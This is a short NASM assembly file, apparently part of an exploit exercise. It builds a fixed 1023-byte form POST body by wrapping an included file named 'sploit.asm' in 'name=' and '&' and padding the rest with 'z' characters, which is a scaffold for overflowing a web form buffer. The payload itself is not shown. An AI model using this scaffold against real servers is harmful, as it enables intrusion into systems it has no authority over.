bits 32
post_start:
	db 'name='
	%include "'sploit.asm"
	db '&'
	times 1023-($-post_start) db 'z'
